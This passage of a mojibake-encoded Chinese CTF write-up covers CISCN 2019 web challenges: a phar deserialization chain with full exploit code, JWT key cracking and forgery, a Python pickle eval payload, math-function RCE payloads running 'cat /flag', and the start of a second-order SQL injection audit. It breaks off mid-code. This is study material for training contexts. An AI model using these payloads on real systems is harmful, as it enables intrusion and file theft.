æœã€‚æ¥ä¸‹æ¥é‡å¿ƒæ”¾åœ¨ååºåˆ—åŒ–ä¸Šã€‚é¦–å…ˆéœ€è¦æ˜ç¡®çš„æ˜¯ï¼Œæˆ‘ä»¬æºç ä¸­å¹¶ä¸å­˜åœ¨<code>unserialize()</code>å‡½æ•°ï¼Œä½†æ˜¯æˆ‘ä»¬æœ‰æ–‡ä»¶ä¸Šä¼ ç‚¹ã€‚æ‰€ä»¥ååºåˆ—åŒ–éœ€è¦é€šè¿‡ä¸Šä¼ pharæ–‡ä»¶å¹¶è¿›è¡Œ<code>phar://</code>ä¼ªåè®®è§¦å‘ã€‚</p><p>æ¥ä¸‹æ¥å¯»æ‰¾å¸¸è§æ–‡ä»¶è¯»å–å‡½æ•°ï¼Œæ³¨æ„åˆ°Fileç±»<code>file_get_contents()</code>æ–¹æ³•</p><pre><code class="php">public function close() {    return file_get_contents($this-&gt;filename);}</code></pre><p>ç¡®å®šæ˜¯å¯ä»¥è¿›è¡Œæ–‡ä»¶è¯»å–äº†ã€‚æ¥ä¸‹æ¥æŒ–æ˜ä¸€ä¸‹å‡½æ•°çš„è°ƒç”¨ã€‚é¦–å…ˆ<code>close()</code>æ˜¯Fileç±»çš„æ–¹æ³•ï¼Œè€ŒFileç±»åªåœ¨Filelistç±»ä¸­æœ‰è°ƒç”¨è¿‡ã€‚ä½†Filelistä¸­å¹¶æ²¡æœ‰è°ƒç”¨<code>close()</code>æ–¹æ³•çš„ä½ç½®ã€‚æ­¤æ—¶éœ€è¦æ³¨æ„Filelistç±»ä¸­çš„ä¸¤ä¸ªé­”æœ¯æ–¹æ³•ä¹‹ä¸€ï¼š</p><pre><code class="php">public function __call($func, $args) {        array_push($this-&gt;funcs, $func);        foreach ($this-&gt;files as $file) {            $this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();        }    }</code></pre><p>å®ƒå°†Filelistç±»ä¸­çš„filesæ•°ç»„å…¨éƒ¨éå†äº†ä¸€éï¼Œå¹¶æ‰§è¡Œå¯¹åº”çš„<code>func()</code>ç»“æœè¢«å­˜è¿›resultã€‚ä¹‹åçš„<code>__destruct()</code>æ–¹æ³•åˆ™ä¼šå°†resultç­‰ç­‰ç»“æœæ‰“å°å‡ºæ¥ã€‚<br>è¿™ä¸€æ¡åˆ©ç”¨åœ¨äºï¼šç¡®ä¿äº†Filelistçš„å¯¹è±¡å¦‚æœèƒ½å€Ÿæ­¤é­”æœ¯æ–¹æ³•è°ƒç”¨<code>close()</code>æ–¹æ³•ï¼Œé‚£ä¹ˆå®ƒæœ€åé”€æ¯æ—¶ææ„å‡½æ•°ä¼šæ‰“å°å‡ºæˆ‘ä»¬éœ€è¦çš„æ–‡ä»¶å†…å®¹ã€‚<br>ä¹‹åå†æ¬¡å®¡è®¡ï¼Œæ³¨æ„åˆ°Userç±»çš„<code>__destruct()</code>æ–¹æ³•</p><pre><code class="php">public function __destruct() {        $this-&gt;db-&gt;close();    }</code></pre><p>åŸæœ¬åªæ˜¯ä¸€ä¸ªåŒå<code>close()</code>å‡½æ•°ï¼Œä½†æ˜¯æ­¤å¤„å´å­˜åœ¨ç€å¯åˆ©ç”¨ä¹‹å¤„ã€‚å‡å¦‚æˆ‘ä»¬çš„æ–‡ä»¶ä¸Šä¼ çš„æ˜¯Userç±»çš„å¯¹è±¡ã€‚é”€æ¯æ—¶è‡ªç„¶ä¼šæ‰§è¡Œ<code>close()</code>å‡½æ•°ã€‚ä½†å¦‚æœæŠŠ<code>db</code>è®¾ç½®ä¸ºFilelistç±»çš„å¯¹è±¡ï¼Œé‚£ä¹ˆ<code>db-&gt;close()</code>æ‰§è¡Œæ—¶å°†æ‰¾ä¸åˆ°<code>close()</code>å‡½æ•°ï¼Œè¿›è€Œæ‰§è¡Œå…¶<code>files</code>æ•°ç»„é‡Œçš„æ¯ä¸€ä¸ªå‡½æ•°ã€‚é‚£ä¹ˆå¦‚æœ<code>files</code>æ•°ç»„é‡Œæ˜¯å­˜åœ¨åŒåå‡½æ•°<code>close</code>çš„Fileç±»å¯¹è±¡ï¼Œå°±èƒ½æˆåŠŸæ‰§è¡Œæ–‡ä»¶è¯»å–ã€‚<br>æ‰¾åˆ°åˆ©ç”¨é“¾åï¼Œexpå¦‚ä¸‹ï¼š</p><pre><code class="php">&lt;?phpclass User {    public $db;}class File {    public $filename;}class FileList {    private $files;    private $results;    private $funcs;    public function __construct() {        $file = new File();        $file-&gt;filename = &#39;/flag.txt&#39;;        $this-&gt;files = array($file);        $this-&gt;results = array();        $this-&gt;funcs = array();    }}@unlink(&quot;phar.phar&quot;);$phar = new Phar(&quot;a.phar&quot;); $phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); $o = new User();$o-&gt;db = new FileList();$phar-&gt;setMetadata($o);$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);$phar-&gt;stopBuffering();</code></pre><p>ç”Ÿæˆçš„a.pharä¿®æ”¹åç¼€ä¸Šä¼ ï¼Œä¹‹åéœ€è¦æ‰¾è§¦å‘æ–¹å¼ï¼Œæ­¤å¤„éœ€è¦æ³¨æ„ä¸€ç‚¹ï¼Œåœ¨download.phpä¸­ï¼Œè®¾ç½®äº†ç›®å½•ï¼š</p><pre><code class="php">ini_set(&quot;open_basedir&quot;, getcwd() . &quot;:/etc:/tmp&quot;);</code></pre><p>è€Œåªæœ‰delete.phpä¸­çš„ç›®å½•æ˜¯åœ¨é¢˜ç›®ç»™å®šçš„æ–‡ä»¶ä¸Šä¼ æ²™ç›’ä¸­çš„ï¼š</p><pre><code class="php">chdir($_SESSION[&#39;sandbox&#39;]);</code></pre><p>æ•…åªæœ‰deleteæ“ä½œèƒ½ç›´æ¥<code>phar://</code>è§¦å‘ååºåˆ—åŒ–ã€‚<br><img src="/2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/flag1.PNG" class="lazyload" data-srcset="flag1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag"></p><p>(è¿™é‡Œçš„æ–‡ä»¶è¯»å–flag.txtæ˜¯ä¼ ç»Ÿè‰ºèƒ½ï¼Ÿæ¯æ¬¡é¢˜ç›®éƒ½æ²¡äº¤ä»£ï¼‰</p><h1 id="ikun-pythonååºåˆ—åŒ–"><a href="#ikun-pythonååºåˆ—åŒ–" class="headerlink" title="ikun(pythonååºåˆ—åŒ–)"></a>ikun(pythonååºåˆ—åŒ–)</h1><p>ç»“åˆäº†å¾ˆå¤šçŸ¥è¯†ç‚¹çš„ä¸€é“é¢˜ç›®ï¼Œä½†æ˜¯æœ€åä¸€æ­¥çš„pythonååºåˆ—åŒ–ç¡®å®ä¸ä¼šï¼Œåªå¥½å»æ‰¾äº†æ‰¾wpã€‚(æœ¬æ¥ä¹‹å‰æ‰“ç®—å­¦ä¸‹pythonååºåˆ—åŒ–çš„ï¼Œç»“æœæå¿˜äº†hhh) </p><p>é¦–å…ˆç™»é™†é¢˜ç›®å‘ç°åœ¨è¿«å®³cxkï¼ŒåŒæ—¶åº•ä¸‹æœ‰è®¸å¤šå•†å“æç¤ºéœ€è¦è´­ä¹°lv6çš„å•†å“ã€‚ä½†æ˜¯çœ‹äº†åŠå¤©å‰å‡ é¡µå¹¶æ²¡æ‰¾åˆ°lv6å•†å“ï¼Œç”±äºé¡µæ•°pageç›´æ¥getä¼ å€¼ï¼Œçœ‹æ¥éœ€è¦è„šæœ¬çˆ†ç ´ä¸€ä¸‹ï¼š</p><pre><code class="python">import requestsurl=&#39;http://2c771d3e-86f0-4f72-9815-f19dcb4fd51a.node3.buuoj.cn/shop?page=&#39;for i in range(0,2000):    r=requests.get(url+str(i))    if &#39;lv6.png&#39; in r.text:        print (i)        break</code></pre><p>ä¹‹åå‘ç°lv6å•†å“ï¼ŒåŠ å…¥åˆ°è´­ç‰©è½¦åï¼Œå‡†å¤‡æ³¨å†Œè´¦å·å¹¶ç™»å½•è´­ä¹°ã€‚æ˜¾ç„¶é’±æ•°æ˜¯ä¸å¤Ÿçš„ï¼Œä½†æ˜¯å´æœ‰æŠ˜æ‰£è¿™ä¸€å‚æ•°è¢«ç›´æ¥postä¼ å€¼ã€‚é‚£ä¹ˆä¿®æ”¹å…¶å€¼è¶³å¤Ÿå°å³å¯ã€‚å¾—åˆ°ä¸€ä¸ªç›®å½•<code>b1g_m4mber</code>ã€‚åº”è¯¥æ˜¯åå°åœ°å€ã€‚<br>è®¿é—®ç½‘å€æç¤ºéœ€è¦adminæ“ä½œæƒé™ã€‚è¿™é‡ŒæŠ“åŒ…ä¸€ä¸‹ï¼Œå‘ç°cookieé‡Œå±…ç„¶æœ‰JWTã€‚çœ‹æ¥æ˜¯æ¯”è¾ƒå¸¸è§çš„JWTä¼ªé€ è®¤è¯äº†ã€‚<br>(ä¹‹å‰åœ¨hacktheboxæŸä¸€å°é¶æœºä¸­å°±å­˜åœ¨ä»¿é€ JWTç™»å½•çš„æ“ä½œï¼Œåº”è¯¥è¯´å¹¶ä¸éš¾ï¼Œè€Œä¸”æ¯”è¾ƒå¥½ç†è§£)<br>å…ˆæ‹¿æ¥base64è§£ç ï¼Œå‘ç°å­˜åœ¨ä¹±ç ã€‚å¯èƒ½æ˜¯å› ä¸ºåŠ äº†ç›å€¼keyçš„åŸå› ã€‚é‚£ä¹ˆç¬¬ä¸€æ­¥å…ˆçˆ†ç ´ä¸‹keyå€¼ï¼š<br><a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">https://github.com/brendan-rius/c-jwt-cracker</a><br><img src="/2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/1.PNG" class="lazyload" data-srcset="1.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="1.PNG"><br>å¾—åˆ°JWTKey ä¸º1Kun,æ¥ä¸‹æ¥ä¸Š<a href="https://jwt.io/" target="_blank" rel="noopener">https://jwt.io/</a><br>å»ç”Ÿæˆadminçš„jwt token.<br><img src="/2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/2.PNG" class="lazyload" data-srcset="2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="jwtä¼ªé€ "><br>å¯ä»¥çœ‹åˆ°jwt-tokenä¸€å®šæ˜¯xxx.yyy.zzzçš„å½¢å¼ã€‚ä¸”ä¸‰æ®µå„è‡ªä»£è¡¨header,paylaodï¼Œsignatureçš„jsonæ•°æ®å†…å®¹ç»base64å¤„ç†ã€‚çˆ†ç ´keyå€¼ä¿®æ”¹paylloadä¸ºadminä¹Ÿæ˜¯å®¶å¸¸ä¾¿é¥­ã€‚<br>æ§åˆ¶å°é‡Œä¿®æ”¹</p><pre><code>document.cookie=&quot;JWT=xxxxxxxxxxx&quot;</code></pre><p>æˆåŠŸç™»é™†ã€‚</p><p>ä¹‹åå‘ç°æºç å­˜åœ¨<a href="http://www.zipã€‚å¯ä»¥æ‹¿åˆ°æºç ã€‚ç„¶åæˆ‘å°±ä¸ä¼šäº†" target="_blank" rel="noopener">www.zipã€‚å¯ä»¥æ‹¿åˆ°æºç ã€‚ç„¶åæˆ‘å°±ä¸ä¼šäº†</a>â€¦â€¦.<br>æŸ¥wpåå‘ç°æ˜¯pythonååºåˆ—åŒ–ã€‚å…·ä½“æ¼æ´åœ¨Admin.pyï¼š</p><pre><code class="python">import tornado.webfrom sshop.base import BaseHandlerimport pickleimport urllibclass AdminHandler(BaseHandler):    @tornado.web.authenticated    def get(self, *args, **kwargs):        if self.current_user == &quot;admin&quot;:            return self.render(&#39;form.html&#39;, res=&#39;This is Black Technology!&#39;, member=0)        else:            return self.render(&#39;no_ass.html&#39;)    @tornado.web.authenticated    def post(self, *args, **kwargs):        try:            become = self.get_argument(&#39;become&#39;)            p = pickle.loads(urllib.unquote(become))            return self.render(&#39;form.html&#39;, res=p, member=1)        except:            return self.render(&#39;form.html&#39;, res=&#39;This is Black Technology!&#39;, member=0)</code></pre><p>becomeå¯æ§ã€‚<br>è¿™é‡Œå…¶å®å¯ä»¥æŠŠ<code>pickle.loads</code>çš„æ“ä½œç†è§£ä¸ºååºåˆ—åŒ–ã€‚è€Œ<code>__reduce__</code>è¿™ä¸€é­”æœ¯æ–¹æ³•ä¼šåœ¨å¯¹è±¡è¢«pickleæ—¶è°ƒç”¨ã€‚ä»è€Œå¯ä»¥æ„é€ payload:</p><pre><code class="python">import pickleimport urllibclass payload(object):    def __reduce__(self):       return (eval, (&quot;open(&#39;/flag.txt&#39;,&#39;r&#39;).read()&quot;,))a = pickle.dumps(payload())a= urllib.quote(a)print(a)</code></pre><p>è¿™é‡Œæˆ‘çš„expåœ¨æœ¬æœºè·‘å‡ºæ¥ç»“æœä¸çŸ¥ä¸ºä½•æ˜¯é”™çš„ã€‚åªæœ‰ç”¨kaliæ‰è·‘å‡ºæ­£ç¡®çš„ç»“æœ<br><img src="/2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/3.PNG" class="lazyload" data-srcset="3.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="exp"><br>ä¼ å€¼æ‹¿flag<br><img src="/2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/flag2.PNG" class="lazyload" data-srcset="flag2.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag"></p><h1 id="Love-Math-æ„é€ RCE"><a href="#Love-Math-æ„é€ RCE" class="headerlink" title="Love Math(æ„é€ RCE)"></a>Love Math(æ„é€ RCE)</h1><p>æºç ï¼š</p><pre><code class="php">&lt;?phperror_reporting(0);//å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flagif(!isset($_GET[&#39;c&#39;])){    show_source(__FILE__);}else{    //ä¾‹å­ c=20-1    $content = $_GET[&#39;c&#39;];    if (strlen($content) &gt;= 80) {        die(&quot;å¤ªé•¿äº†ä¸ä¼šç®—&quot;);    }    $blacklist = [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;`&#39;, &#39;\[&#39;, &#39;\]&#39;];    foreach ($blacklist as $blackitem) {        if (preg_match(&#39;/&#39; . $blackitem . &#39;/m&#39;, $content)) {            die(&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦&quot;);        }    }    //å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp    $whitelist = [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;];    preg_match_all(&#39;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#39;, $content, $used_funcs);      foreach ($used_funcs[0] as $func) {        if (!in_array($func, $whitelist)) {            die(&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°&quot;);        }    }    //å¸®ä½ ç®—å‡ºç­”æ¡ˆ    eval(&#39;echo &#39;.$content.&#39;;&#39;);}</code></pre><p>é¢˜ç›®å¾ˆæœ‰æ„æ€ï¼Œè¾¾æˆç›®çš„æ˜¾ç„¶æ˜¯RCEã€‚ä½†æ˜¯å¯ä»¥å‘ç°è¿‡æ»¤äº†å¾ˆå¤šå­—ç¬¦ä¸å‡½æ•°ï¼Œé™åˆ¶äº†é•¿åº¦ã€‚è€Œç™½åå•å†…çš„å‡½æ•°å…¨éƒ¨æ˜¯æ•°å­¦å‡½æ•°ï¼Œé»‘åå•çš„å­—ç¬¦è¿‡æ»¤äº†å¸¸è§æ ‡ç‚¹ã€‚ç°åœ¨è¦è¾¾æˆRCEéœ€è¦ç»•è¿‡ä¸Šçš„å¥‡æ·«æŠ€å·§ã€‚</p><p>é¦–å…ˆæœ‰ä¸€ç§æ€è·¯æ˜¯åˆ†å¼€ä¼ å€¼ ï¼Œæˆ‘ä¸ªäººä¹Ÿæ¯”è¾ƒåå¥½è¿™ç§åšæ³•ã€‚å…·ä½“å½¢å¼å¤§è‡´æ˜¯</p><pre><code>?c=$_GET[a]&amp;a=system(&#39;ls&#39;);</code></pre><p>ä½†æ˜¯æ­¤é¢˜é¦–å…ˆå˜é‡åä¸èƒ½éšæ„ï¼Œåªèƒ½ä»ç™½åå•ä¸­æ‰¾å‡ºå¯ç”¨æ•°å­¦ç¬¦å·ä½œä¸ºå˜é‡åã€‚æ­¤å¤„è€ƒè™‘é•¿åº¦ä½¿ç”¨piã€‚<br>ç„¶åæ˜¯è€ƒè™‘ï¼Œåœ¨<code>_GET[]</code>è¢«è¿‡æ»¤çš„æƒ…å†µä¸‹èƒ½ä½¿ç”¨ä»€ä¹ˆæ•°å­¦å‡½æ•°è¾¾æˆæ„é€ å­—ç¬¦ä¸²çš„ç›®çš„ã€‚è¿™é‡Œåº”è¯¥é¦–å…ˆè€ƒè™‘è¿›åˆ¶è½¬æ¢å‡½æ•°ï¼Œå› ä¸º10è¿›åˆ¶ä»¥ä¸Šçš„æ•°éƒ½æœ‰è‹±æ–‡å­—æ¯ä½œä¸ºæ•°ç ã€‚è€Œå‡å¦‚æ˜¯36è¿›åˆ¶æ•°çš„è¯ï¼Œå°†ä¼šæ‹¥æœ‰1~10åŠ ä¸Š26ä¸ªè‹±æ–‡å­—æ¯ä½œä¸ºæ•°ç ï¼Œè¿™è¶³ä»¥æˆ‘ä»¬æ‹¼å‡‘å‡ºpayloadã€‚<br>å‡å¦‚payloadæ˜¯ï¼š</p><pre><code>?c=($_GET){0}($_GET){1};&amp;0=system&amp;1=cat /flag</code></pre><p>é‚£ä¹ˆæˆ‘ä»¬åªéœ€æ„é€ å‡º<code>_GET</code>å­—ç¬¦ä¸²ã€‚<br>å…·ä½“å€’æ¨æ–¹æ³•å¦‚ä¸‹ï¼š</p><pre><code>_GET-&gt;bin2hex(&#39;_GET&#39;)-&gt;5f474554-&gt;hexdec(&#39;5f474554&#39;)-&gt;1598506324#çº¯æ•°å­—#éœ€è¦æ„é€ hex2bin()base_convert(&#39;hex2bin&#39;,36,10)-&gt;37907361743</code></pre><p>æ‰€ä»¥</p><pre><code>$pi=base_convert(37907361743,10,36)(dechex(1598506324));$pi=hex2bin(5f474554);$pi=_GET;$$pi=$_GET;</code></pre><p>æ•…æœ€åpayload</p><pre><code>/?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&amp;pi=system&amp;abs=cat%20/flag</code></pre><p><img src="/2020/02/19/CISCN-2019-web%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/flag.PNG" class="lazyload" data-srcset="flag.PNG" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="flag"><br>é™¤æ­¤ä¹‹å¤–è¿˜å¯ä»¥æ„é€ </p><pre><code>exec(getallheaders(){1})</code></pre><p>åœ¨headersé‡ŒåŠ ä¸Š</p><pre><code>1:cat /flag</code></pre><p>è¿™ä¸€é¡¹æ‰§è¡Œ</p><pre><code>$pi=base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)(){1})</code></pre><p>ç”±äºç»“æœæ˜¯echoè¿”å›çš„ï¼Œä¸Šé¢ä½¿ç”¨é€—å·å¯ä»¥å°†ä¸¤ä¸ªç»“æœéƒ½æ‰“å°å‡ºæ¥ã€‚<br>å…¶ä»–æ€è·¯åŒ…æ‹¬ç›´æ¥æ„é€ RCEè¯­å¥ï¼Œä½†æ˜¯æ„Ÿè§‰æ²¡æœ‰ä¸Šé¢çš„æ–¹æ³•ç”¨èµ·æ¥èˆ’æœã€‚çœ‹åˆ°ç½‘ä¸Šè¿˜æœ‰å…¶ä»–éå¸¸æœ‰æ„æ€çš„è§£æ³•ï¼Œå°±ä¸ä¸€ä¸€åˆ—ä¸¾äº†ã€‚</p><h1 id="CyberPunk-äºŒæ¬¡æ³¨å…¥"><a href="#CyberPunk-äºŒæ¬¡æ³¨å…¥" class="headerlink" title="CyberPunk(äºŒæ¬¡æ³¨å…¥)"></a>CyberPunk(äºŒæ¬¡æ³¨å…¥)</h1><p>ä¸Šæ¥index.phpä¸­ç»™äº†å§“åï¼Œç”µè¯ï¼Œåœ°å€ä¸‰ä¸ªæ¡†æ¥å¡«ã€‚åŒæ—¶è¿˜æœ‰ä¸‰ä¸ªåŠŸèƒ½ï¼šæŸ¥è¯¢ï¼Œä¿®æ”¹ï¼Œåˆ é™¤ã€‚ç”±äºæŸ¥è¯¢è¿™ä¸€ä¸ªæ“ä½œéƒ½åªè¦å§“åç”µè¯ï¼Œæˆ‘çŒœæµ‹å‰©ä¸‹çš„åœ°å€è¿™ä¸ªå‚æ•°å¯èƒ½æ˜¯é€šè¿‡è¾“å…¥å§“åç”µè¯å¯¹åœ°å€è¿›è¡ŒæŸç§è§¦å‘å¼æ³¨å…¥ã€‚åŸºæœ¬å¯ä»¥çŒœæµ‹æ˜¯sqlæ³¨å…¥é¢˜å‹ã€‚</p><p>ä»æºç å¤„å¾—åˆ°ä¸€ä¸ªfileå‚æ•°ã€‚æœæ–­æ–‡ä»¶åŒ…å«è¯»åˆ°æºç ï¼š<br>index.php</p><pre><code class="php">&lt;?phpini_set(&#39;open_basedir&#39;, &#39;/var/www/html/&#39;);$file = $_GET[&quot;file&quot;];$file = (isset($_GET[&#39;file&#39;]) ? $_GET[&#39;file&#39;] : null);if (isset($file)){    if (preg_match(&quot;/phar|zip|bzip2|zlib|data|input|%00/i&quot;,$file)) {        echo(&#39;no way!&#39;);        exit;    }    @include($file);}?&gt;</code></pre><p>search.php</p><pre><code class="php">&lt;?phprequire_once &quot;config.php&quot;; if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;])){    $msg = &#39;&#39;;    $pattern = &#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;;    $user_name = $_POST[&quot;user_name&quot;];    $phone = $_POST[&quot;phone&quot;];    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){         $msg = &#39;no sql inject!&#39;;    }else{        $sql = &quot;select * from `user` where `user_name`=&#39;{$user_name}&#39; and `phone`=&#39;{$phone}&#39;&quot;;        $fetch = $db-&gt;query($sql);    }    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0){        $row = $fetch-&gt;fetch_assoc();        if(!$row) {            echo &#39;error&#39;;            print_r($db-&gt;error);            exit;        }        $msg = &quot;&lt;p&gt;å§“å:&quot;.$row[&#39;user_name&#39;].&quot;&lt;/p&gt;&lt;p&gt;, ç”µè¯:&quot;.$row[&#39;phone&#39;].&quot;&lt;/p&gt;&lt;p&gt;, åœ°å€:&quot;.$row[&#39;address&#39;].&quot;&lt;/p&gt;&quot;;    } else {        $msg = &quot;æœªæ‰¾åˆ°è®¢å•!&quot;;    }}else {    $msg = &quot;ä¿¡æ¯ä¸å…¨&quot;;}?&gt;</code></pre><p>change.php</p><pre><code class="php">&lt;?phprequire_once &quot;config.php&quot;;if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;])){    $msg = &#39;&#39;;    $pattern = &#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;;    $user_name = $_POST[&quot;user_name&quot;];    $address = addslashes($_POST[&quot;address&quot;]);    $phone = $_POST[&quot;phone&quot;];    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){        $msg = &#39;no sql inject!&#39;;    }else{        $sql = &quot;select * from `user` where `user_name`=&#39;{$user_name}&#39; and `phone`=&#39;{$phone}&#39;&quot;;        $fetch = $db-&gt;query($sql);    }    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0){        $row = $fetch-&gt;fetch_assoc();        $sql = &quot;update `user` set `address`=&#39;&quot;.$address.&quot;&#39;, `old_address`=&#39;&quot;.$row[&#39;address&#39;].&quot;&#39; where `user_id`=&quot;.$row[&#39;user_id&#39;];        $result = $db-&gt;query($sql);        if(!$result) {            echo &#39;error&#39;;            print_r($db-&gt;error);            exit;        }        $msg = &quot;è®¢å•ä¿®æ”¹æˆåŠŸ&quot;;    } else {        $msg = &quot;æœªæ‰¾åˆ°è®¢å•!&quot;;    }}else {    $msg = &quot;ä¿¡æ¯ä¸å…¨&quot;;}?&gt;</code></pre><p>delete.php</p><pre><code class="php">&lt;?phprequire_once &quot;config.php&quot;;if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;])){    $msg = &#39;&#39;;    $pattern = &#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;;    $user_name = $_POST[&quot;user_name&quot;];    $phone = $_POST[&quot;phone&quot;];    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){         $msg = &#39;no sql inject!&#39;;    }else{        $sql = &quot;select * from `user` where `user_name`=&#39;{$user_name}&#39; and `phone`=&#39;{$phone}&#39;&quot;;        $fetch = $db-&gt;query($sql);    }    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0){        $row = $fetch-&gt;fetch_assoc();        $result = $db-&gt;query(&#39;delete from `user` where `user_id`=&#39; . $row[&quot;user_id&quot;]);        if(!$result) {            echo &#39;error&#39;;            print_r($db-&gt;error);            exit;        }        $msg = &quot;è®¢å•åˆ é™¤æˆåŠŸ&quot;;    } else {        $msg = &quot;æœªæ‰¾åˆ°è®¢å•!&quot;;    }}else {    $msg = &quot;ä¿¡æ¯ä¸å…¨&quot;;}?&gt;</code></pre><p>å®¡è®¡æºç åé‡ç‚¹å…³æ³¨addressæœ‰æ— æ³¨å…¥ï¼Œå‘ç°é¢˜ç›®éƒ½åªå¯¹å‰ä¸¤ä¸ªå‚æ•°è¿›è¡Œäº†è¿‡æ»¤ï¼Œå¹¶æœªæ£€æŸ¥<code>address</code>ã€‚åŒæ—¶<code>address</code>åªç»è¿‡äº†ä¸€æ¬¡<code>addslashes()</code>å°±è¢«å­˜å‚¨ï¼Œè¿™æ˜¯ç»å…¸çš„äºŒæ¬¡æ³¨å…¥çš„ä½¿ç”¨åœºæ™¯ã€‚åŠ ä¸Šè§¦å‘æ–¹å¼ï¼š</p><pre><code class="php">if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0){        $row = $fetch-&gt;fetch_assoc();        $sql = &quot;update `user` set 